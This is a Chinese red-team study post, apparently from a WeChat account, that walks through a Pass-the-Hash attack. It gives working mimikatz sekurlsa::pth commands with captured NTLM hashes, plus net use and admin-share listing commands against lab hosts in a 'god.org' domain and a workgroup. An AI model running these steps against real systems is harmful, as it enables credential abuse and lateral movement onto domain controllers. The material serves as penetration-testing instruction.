\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/T5tJ3GkeNKmyFXyW4CEr1A)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **25** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

哈希传递攻击

哈希传递（Pass The Hash）攻击，该方法通过找到与账户相关的密码散列值（通常是 NTLM Hash）来进行攻击。

在域环境中，用户登录计算机时使用的大概都是域账号，大量计算机在安装时会使用相同的本地管理员账户密码，因此如果计算机的本地管理员账户和密码相同的话，攻击者就能使用哈希传递攻击的方法登录内网中的其他计算机。

哈希传递攻击的好处
---------

通过哈希传递攻击，攻击者不需要花时间破解密码散列值来获取明文密码。

在 Windows Server 2012 R2 及之后的版本的操作系统中，默认在内存中不会记录明文密码，因此，攻击者往往会使用工具将散列值传递到其他计算机中，进行权限验证，实现对远程计算机的控制。

哈希传递攻击分析
--------

散列值的概念：当用户登录一个网站的时候，如果该网站使用的是明文密码来保存密码，那么一旦网站被攻破，所有用户的明文密码都会被泄露，所有就产生了散列值的概念。

哈希传递攻击的前提：有管理员的 NTLM Hash ，并且目标机器开放 445 端口。

#### 在工作组环境中

*   Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
    
*   Windows Vista 之后的机器，只能是 administrator(SID 为 500)用户的哈希值才能进行哈希传递攻击，其他用户 (包括管理员用户但是非 administrator) 也不能使用哈希传递攻击，会提示拒绝访问。
    

> 这里强调的是 SID 为 500 的账号，在一些计算机中，即使将 Administrator 账号改名，也不会影响 SID 的值。再补充一下：管理员组的非 SID500 账户登录之后是没有过 UAC 的，所有特权都被移除。而 SID500 账户登录之后也以完全管理特权（” 完全令牌模式”）运行所有应用程序，实际是不用过 UAC 的。

**Hash 传递攻击**

**使用 NTLM Hash 进行哈希传递**

* * *

##### mimikatz（域环境）

用到的工具是 Mimikatz 。

首先是使用 Mimikatz 抓取到了域管的 NTLM Hash：

```
administrator
ccef208c6485269c20db2cad21734fe7
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLPx9ib8gM0vSL86ySpNu7gqsbSmibSrISvcLHKXuvQkwZ2z4nq7JuLE1ibscib1M9X6Nr7NiczeYCic0Qg/640?wx_fmt=png)

重点在于使用哈希传递的时候需要用管理员权限运行 mimikatz，我们已经获取了域管理员组内用户的 NTLM 哈希值。我们可以使用域内的一台主机用 mimikatz 对域内任何一台机器 (包括域控) 进行哈希传递攻击。执行完命令后，会弹出 CMD 窗口，在弹出的 CMD 窗口我们可以访问域内任何一台机器。前提是我们必须拥有域内任意一台主机的本地管理员权限和域管理员的密码 NTLM 哈希值。

攻击者：mary.god（域用户，有管理员权限的 shell）

目标：god.administrator（域管理员）

目标 IP：192.168.3.21

首先是使用 Mimikatz 抓取到了域管理员的 NTLM Hash：

```
god.org
administrator
ccef208c6485269c20db2cad21734fe7
```

```
\# 运行命令弹出CMD
mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7"
# 与域控建立IPC
net use \\\\192.168.3.21
# 查看目标机器的C盘文件
dir \\\\192.168.3.21\\c$
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLPx9ib8gM0vSL86ySpNu7gqAqdZQbib0iaRtcLwLfjI1byia6V1oFFWtozM0iaY5Y5SoNNEtJdfn9cbqg/640?wx_fmt=png)

mimikatz（工作组环境）  

攻击者：mary（工作组，管理员权限）

目标：administrator（本地管理员）

目标 IP：192.168.3.31

首先是使用 Mimikatz 抓取到了本地管理员的 NTLM Hash：

```
administrator
518b98ad4178a53695dc997aa02d455c
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLPx9ib8gM0vSL86ySpNu7gqHuCNgVZHkCArN0vVV0s1GENMRPrBvqhxuLlAKIAoR6FZQ6X1vRDooA/640?wx_fmt=png)

运行命令：

```
mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:目标机器IP /ntlm:xxxxxx"
#实例
mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:192.168.3.31 /ntlm:518b98ad4178a53695dc997aa02d455c"
# 与本地管理员建立IPC
net use \\\\192.168.3.21
# 查看目标机器的C盘文件
dir \\\\192.168.3.31\\c$
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLPx9ib8gM0vSL86ySpNu7gqTicB9u3sjgSvmGOvQiaW5vQ0ibFz33UdRQb1Gpqic7ibm6wtTQSbx1pAguQ/640?wx_fmt=png)

PS：有的时候 dir 后面跟 IP 地址会提示用户名或密码错误，这个时候我们需要输入目标的主机名：

```
dir \\\\OWA2010CN-God\\c$
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLPx9ib8gM0vSL86ySpNu7gqq6z5hAIMiaeoe9mGwncPDI4iaA4mGpqchzbBgyiayKxibrFsic4Qicz7VNGw/640?wx_fmt=png)

成功，此时会自动弹出一个新的 shell，这时访问远程主机或服务，就不用提供明文密码了，如下，我们列出了域控制器的 c 盘目录：  

注意，哈希传递攻击要注意一下几点：

*   dir 命令后面要使用主机名，不能用 IP，否则报错
    
*   使用 mimikatz 进行哈希传递要具有本地管理员权限
    

* * *

渗透攻击红队 发起了一个读者讨论 快来发表你的评论把！

参考文章：

https://mp.weixin.qq.com/s/MtomFV5oKziT6\_Zt1rBpKQ

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看